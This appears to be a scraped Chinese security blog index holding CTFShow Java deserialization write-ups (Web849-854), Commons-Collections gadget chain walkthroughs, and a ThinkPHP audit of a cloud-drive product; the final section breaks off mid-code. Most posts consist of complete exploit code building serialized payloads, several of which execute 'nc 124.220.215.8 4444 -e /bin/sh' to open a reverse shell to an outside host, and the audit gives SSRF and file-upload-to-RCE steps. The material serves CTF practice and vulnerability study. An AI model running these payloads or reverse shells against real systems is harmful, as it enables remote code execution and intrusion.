","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:3:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web849Java8 commons-collections4.0 用CC2链 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.swing.text.AbstractDocument; import javax.xml.transform.Templates; import javax.xml.ws.spi.Invoker; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\"transformer\"); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(priorityQueue); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } Test.java import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { { try { Runtime.getRuntime().exec(\"nc 124.220.215.8 4444 -e /bin/sh\"); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:4:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web850Java7 commons-collections3.1 用CC3链打 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String p = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(p); } } 注 这里的恶意类需要用jdk7版本编译,否则环境中无法识别到 https://y4tacker.github.io/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/ ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:5:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web851JDK8 commons-collections4.0 用CC6的链打，但是需要注意的是导入org.apache.commons.collections4 package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Outermap = LazyMap.lazyMap(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(Outermap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); Outermap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Outermap,chainedTransformer); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(map2); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } 需要做修改的是，在4.0版本decorate被lazymap代替了 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:6:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web852JDK8 commons-collections4.0 继续用上面的poc打 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:7:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web853用yuxx师傅的链子，基于CC7链修改了适用于CommonsCollections4.0的poc package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.map.DefaultedMap; import java.io.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Constructor; import java.util.Base64; import java.io.ByteArrayOutputStream; public class CommonsCollections7 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; Transformer transformerChain2 = new ChainedTransformer(transformers); Map hashMap1 = new HashMap(); Map hashMap2 = new HashMap(); Class\u003cDefaultedMap\u003e d = DefaultedMap.class; Constructor\u003cDefaultedMap\u003e declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class); declaredConstructor.setAccessible(true); DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain2); DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain2); defaultedMap1.put(\"yy\", 1); defaultedMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(defaultedMap1, 1); hashtable.put(defaultedMap2, 1); defaultedMap2.remove(\"yy\"); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashtable); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:8:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web854JDK8 commons-collections4.0 过滤了一些东西 - TransformedMap - PriorityQueue - InstantiateTransformer - TransformingComparator - TemplatesImpl - AnnotationInvocationHandler - HashSet - Hashtable - LazyMap 构造一条新的链子 package org.example.CommonsCollections; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import org.apache.commons.collections4.map.DefaultedMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Constructor; import java.util.Base64; import java.io.ByteArrayOutputStream; public class CommonsCollections7 { public static void main(String[] args) throws Exception{ Transformer transformerChain = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"nc 124.220.215.8 4444 -e /bin/sh\"}) }; Map innerMap1 = new HashMap(); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); Class\u003cDefaultedMap\u003e d = DefaultedMap.class; Constructor\u003cDefaultedMap\u003e declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class); declaredConstructor.setAccessible(true); DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain); TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, \"test\"); HashMap\u003cObject, Object\u003e hashMap=new HashMap\u003c\u003e(); hashMap.put(tiedMapEntry,\"test01\"); map.remove(\"test\"); Field iTransformers = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); iTransformers.setAccessible(true); iTransformers.set(transformerChain,transformers); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashMap); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(b.toByteArray())); // ois.readObject(); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:9:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web854链子分析可以看到上面的poc，仍然是调用到了InvokerTransformer类中的transform方法 来看一下调用栈 可以看到是调用了DefaultedMap类中的get方法，存在transform方法 也就是说将之前的LazyMap类中的get方法，换成了DefaultedMap类中的get方法 引用Evo1ution师傅总结的一张照片 ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:9:1","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" CommonsCollections2-4-5链详解Commons-Collections版本为4.0 ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections4 链详解仍然是调用了transform方法，但入口点变了位置，这次利用了TransformingComparator类compare()方法中的transform方法 在PriorityQueue类中的readObject方法恰好调用了compare方法 跟进heapify() 跟进siftDown() 再跟进siftDownUsingComparator() 正好在这里调用了compare()方法 构造一下poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception { TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); Class priorityClass = priorityQueue.getClass(); Field sizeField = priorityClass.getDeclaredField(\"size\"); sizeField.setAccessible(true); sizeField.set(priorityQueue,2); //serialize(priorityQueue); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:1","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections2 链详解利用InvokerTransformer方法，来调用newTransformer()来加载恶意类的调用 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.swing.text.AbstractDocument; import javax.xml.transform.Templates; import javax.xml.ws.spi.Invoker; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{}); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(\"transformer\"); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); // serialize(priorityQueue); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:2","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections5 链详解这里利用了TiedMapEntry类中的toString()方法 \u0008接着又去调用了getValue() 然后调用了任意类的get()方法，这里直接用LazyMap类中的get()方法即可 后面的直接用 CC1 部分链 这里的入口点readObject()需要选一个有toString()方法的，这里用BadAttributeValueExpException类中的readObject()方法 构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.map.TransformedMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,1); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); Class c = Class.forName(\"javax.management.BadAttributeValueExpException\"); Field valField = c.getDeclaredField(\"val\"); valField.setAccessible(true); valField.set(badAttributeValueExpException,tiedMapEntry); //serialize(badAttributeValueExpException); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-17","objectID":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:3","tags":["CommonsCollections"],"title":"CommonsCollections2 4 5链详解","uri":"/commonscollections2-4-5%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["PHP"],"content":"ThinkPHP5.0完全开发手册 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 某盘代码审计学习完开发手册，先来套源码试试手。 想要快速入手代码审计，就要先看手册了解一些底层架构等等 从index.php开始 和原来的相比改动不大，应用目录是application，直接进行查看 先看config.php，看一些配置信息能够帮助我们快速了解此套源码 全局过滤方法 访问模式，最最最重要的是我们的控制器 可以看到，它开启了路由但是并没有打开强制路由 这里看一下路由，并没有什么东西 想要得到未授权RCE，还是得先看Index模块下面的控制器，因为可能有未授权访问，像这种 MVC 架构admin模块下，未授权太少了Orz 除了Api、Login控制器，其他控制器均继承了Base控制器 那他们为什么要都继承Base呢？进入看一下 Orz在构造函数下面做了权限验证，扫了一眼除非知道数据库里的$header_uid不然无法绕过 但是，我们上面还提到了一个api控制器，没有继承。进入查看一下 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x01 SSRF在curlfun()函数下面，看到了一个很明显的SSRF public function curlfun($url, $params = array(), $method = 'GET') { $header = array(); $opts = array(CURLOPT_TIMEOUT =\u003e 10, CURLOPT_RETURNTRANSFER =\u003e 1, CURLOPT_SSL_VERIFYPEER =\u003e false, CURLOPT_SSL_VERIFYHOST =\u003e false, CURLOPT_HTTPHEADER =\u003e $header); /* 根据请求类型设置特定参数 */ switch (strtoupper($method)) { case 'GET' : $opts[CURLOPT_URL] = $url . '?' . http_build_query($params); $opts[CURLOPT_URL] = substr($opts[CURLOPT_URL],0,-1); break; case 'POST' : //判断是否传输文件 $params = http_build_query($params); $opts[CURLOPT_URL] = $url; $opts[CURLOPT_POST] = 1; $opts[CURLOPT_POSTFIELDS] = $params; break; default : } /* 初始化并执行curl请求 */ $ch = curl_init(); curl_setopt_array($ch, $opts); $data = curl_exec($ch); $error = curl_error($ch); curl_close($ch); if($error){ $data = null; } return $data; } 先本地起一个服务 构造一个poc试试， /index.php/index/api/curlfun?url=http://localhost:9080/ssrf.txt ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x02 SSRFapi控制器下，还存在一个post_url方法，也存在SSRF public function post_curl($url,$data){ $ch = curl_init($url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"POST\"); curl_setopt($ch, CURLOPT_POSTFIELDS,$data); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $result = curl_exec($ch); if (curl_errno($ch)) { print curl_error($ch); } curl_close($ch); return $result; } ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x03 后台 RCE在admin模块setup控制器editconf方法处，存在文件上传漏洞 public function editconf() { // echo \"test\"; // if($this-\u003eotype != 3){ // echo '死你全家!';exit; // } if(input('post.')){ $data = input('post.'); foreach ($data as $k =\u003e $v) { $arr = explode('_',$k); $_data['id'] = $arr[1]; $_data['value'] = $v; $file = request()-\u003efile('pic_'.$_data['id']); if($file){ $info = $file-\u003emove(ROOT_PATH . 'public' . DS . 'uploads'); if($info){ $_data['value'] = '/public' . DS . 'uploads/'.$info-\u003egetSaveName(); } } if($_data['value'] == '' \u0026\u0026 isset($arr[2]) \u0026\u0026 $arr[2] == 3){ continue; } Db::name('config')-\u003eupdate($_data); } cache('conf',null); $this-\u003esuccess('编辑成功'); } } 可以看到直接input接受参数，并且利用了request()-\u003efile来上传文件 而在thinkphp中的file函数，是没有安全设置的 所以可以直接进行上传， 构造poc 在public目录下面，成功进行了上传 但是文件名字看起来是一串随机的字符串组成的，这怎么办呢？我们根进去查看一下是怎么生成的，跟进move函数 看到了buildSavename函数正是文件保存命名规则， 跟进去查看一下，命名规则是date日期 前面的date函数是 uploads 下面的目录，而后面的md5(microtime(true))正是生成的那一串看似随机的字符串，爆破一下即可出文件名 那针对microtime(true)这样的该如何爆破呢？ 在ctfshow 元旦水友赛中出过这样一道题 https://docs.qq.com/doc/DRlBMcWdhZW9ZUnFB 里面有爆破脚本 在System控制器下，同样存在类似的功能点 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:3","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习-某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["Java"],"content":" CommonsCollections3详解通过类动态加载可以得知defineClass可以执行任意代码 全局搜索一下哪里调用了defineClass, TemplatesImpl类里调用了，再全局搜索一下哪里调用了这里的defineClass类 在defineTransletClasses方法这里进行了调用 再搜索一下哪里调用了defineTransletClasses 在getTransletInstance()方法调用了defineTransletClasses()方法并且，还执行了newInstance()进行了初始化操作，可以将注入的类执行 编写这部分的poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = 